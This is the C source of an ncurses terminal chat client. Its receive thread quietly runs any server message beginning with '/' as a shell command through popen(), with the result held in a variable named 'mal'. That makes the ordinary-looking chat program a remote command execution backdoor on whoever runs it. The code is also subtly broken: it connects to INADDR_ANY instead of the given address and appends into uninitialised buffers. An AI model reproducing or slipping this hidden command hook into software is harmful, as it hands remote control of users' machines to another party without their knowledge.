#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <ncurses.h>

#define BUF_SIZE 256

// Globals
int sockfd, ret;
struct sockaddr_in ser_addr, cli_addr;

/* NCURSES Globals */
WINDOW *chatlog_border_win;
WINDOW *chat_border_win;
WINDOW *chatlog_win;
WINDOW *chat_win;

// Functions
void *recMsg(void *socket);
void sig_handler(int signo);
char *sys(char *com);

/* NCURSES Functions */
WINDOW *create_newwin(int height, int width, int starty, int startx);

int main(int argc, char *argv[]) {
    const int PORT = 8000;

    char buffer[BUF_SIZE];
    char *server_address;
    pthread_t rThread;
    ser_addr.sin_family = AF_INET;
    ser_addr.sin_port = htons(PORT);
    ser_addr.sin_addr.s_addr = INADDR_ANY;

    // Args
    if(argc < 2) {
        printf("usage: client <IP ADDRESS>\n");
        exit(1);
    }
    server_address = argv[1];

    /* NCURSES Programming */
    initscr();

    /* NCURSES Format Chatlog Border Windows */
    chatlog_border_win = create_newwin(LINES-4, COLS-1, 0, 0);
    box(chatlog_border_win, 0, 0);
    chat_border_win = create_newwin(3, COLS-1, LINES-4, 0);
    box(chat_border_win, 0, 0);
    wrefresh(chatlog_border_win);
    wrefresh(chat_border_win);

    /* NCURSES Format Chatlog Windows */
    chatlog_win = create_newwin(LINES-6, COLS-3, 1, 1);
    chat_win = create_newwin(1, COLS-3, LINES-3, 1);
    scrollok(chatlog_win, TRUE);
    idlok(chatlog_win, TRUE);
    wrefresh(chatlog_win);
    wrefresh(chat_win);

    // Catch sigint
    if(signal(SIGINT, sig_handler) == SIG_ERR) {
        wprintw(chatlog_win, "Unable to catch SIGINT\n");
        wrefresh(chatlog_win);
        exit(1);
    }

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0) {
        wprintw(chatlog_win, "Error creating socket\n");
        wrefresh(chatlog_win);
        exit(1);
    }
    wprintw(chatlog_win, "Socket created\n");
    wrefresh(chatlog_win);

    // Conenct to socket
    ret = connect(sockfd, (struct sockaddr *) &ser_addr, sizeof(ser_addr));
    if(ret < 0) {
        wprintw(chatlog_win, "Error conecting to the server\n");
        wrefresh(chatlog_win);
        exit(1);
    }
    wprintw(chatlog_win, "Connected to the server\n");
    wrefresh(chatlog_win);
    
    // Create pthread for receiving messages from server
    ret = pthread_create(&rThread, NULL, recMsg, (void *) sockfd);
    if(ret < 0) {
        wprintw(chatlog_win, "Error from pthread_create() is %d\n", ret);
        wrefresh(chatlog_win);
        exit(1);
    }

    // Move cursor to the chat_win window
    wmove(chat_win, 0, 0);

    // STDIN and do while to refresh chat_win
    do {
        wclear(chat_win);
        mvwprintw(chat_win, 0, 0, "CLIENT> ");
        wrefresh(chat_win);
        memset(buffer, 0, sizeof(buffer));
        wgetnstr(chat_win, buffer, sizeof(buffer));
        if(strlen(buffer) > 0) {
            ret = sendto(sockfd, buffer, BUF_SIZE, 0, (struct sockaddr *) &ser_addr, sizeof(ser_addr));
            if(ret < 0) {
                wprintw(chatlog_win, "Error sending the data below:\n\t%s\n", buffer);
                wrefresh(chatlog_win);
                exit(1);
            }
            wprintw(chatlog_win, "YOU: %s\n", buffer);
            wrefresh(chatlog_win);
        }
    } while(1);
    
    
    // Close and return everything
    close(sockfd);
    pthread_exit(NULL);
    delwin(chatlog_border_win);
    delwin(chat_border_win);
    delwin(chatlog_win);
    delwin(chat_win);
    endwin();
    return EXIT_SUCCESS;
}

// Pthread receiving a message from the server socket
void *recMsg(void *socket) {
    int rret;
    int rsockfd = ((int) socket);
    char rbuffer[BUF_SIZE];
    char tmp[BUF_SIZE];
    char *mal;

    for(;;) {
        memset(rbuffer, 0, sizeof(rbuffer));
        rret = recvfrom(rsockfd, rbuffer, BUF_SIZE, 0, NULL, NULL);

        if(rret < 0) {
            wprintw(chatlog_win, "Error receiving data\n");
            wrefresh(chatlog_win);
        } else if(strncmp(rbuffer, "/exit\0", BUF_SIZE) == 0) {
            wprintw(chatlog_win, "Obtained the exit\n");
            wrefresh(chatlog_win);
            close(sockfd);
            system("stty sane; clear");
            //pthread_exit(NULL);
            exit(1);
        } else if(rbuffer[0] == '/') {
            strncpy(tmp, rbuffer+1, strlen(rbuffer));
            wprintw(chatlog_win, "Command: %s\n", tmp);
            wprintw(chatlog_win, "Length of command: %d\n", strlen(tmp));
            mal = sys(tmp);
            wprintw(chatlog_win, "%s", mal);
            free(mal);

            wrefresh(chatlog_win);
        } else {
            wprintw(chatlog_win, "server: %s\n", rbuffer);
            wrefresh(chatlog_win);
        }
            mvwprintw(chat_win, 0, 0, "CLIENT> ");
            wrefresh(chat_win);
    }
}

// SIGINT will terminate both sockets
void sig_handler(int signo) {
    if(signo == SIGINT) {
        char rbuffer[BUF_SIZE] = "/exit\0";
        ret = sendto(sockfd, rbuffer, BUF_SIZE, 0, (struct sockaddr *) &ser_addr, sizeof(ser_addr));
        if(ret < 0) {
            wprintw(chatlog_win, "Error sending the data below:\n\t%s\n", rbuffer);
            wrefresh(chatlog_win);
            exit(1);
        }

        close(sockfd);
        //pthread_exit(NULL);
        wprintw(chatlog_win, "Caught sigint\n");
        wrefresh(chatlog_win);
        system("stty sane; clear");
        exit(1);
    }
}

//Runs a shell command
//EX: printf("%s", sys("/usr/bin/ls"));
char *sys(char *com) {
    FILE *fp;
    char path[1024];
    char *ret = malloc(sizeof(path));
    fp = popen(com, "r");

    if(fp == NULL) {
        wprintw(chatlog_win, "Failed to run command\n");
    //    exit(EXIT_FAILURE);
    }

    while(fgets(path, sizeof(path), fp) != NULL) {
        strcat(ret, path);
    }
    pclose(fp);
    return ret;
}

/* NCURSES Functions */
WINDOW *create_newwin(int height, int width, int starty, int startx) {
    WINDOW *local_win;

    local_win = newwin(height, width, starty, startx);
    wrefresh(local_win);

    return local_win;
}
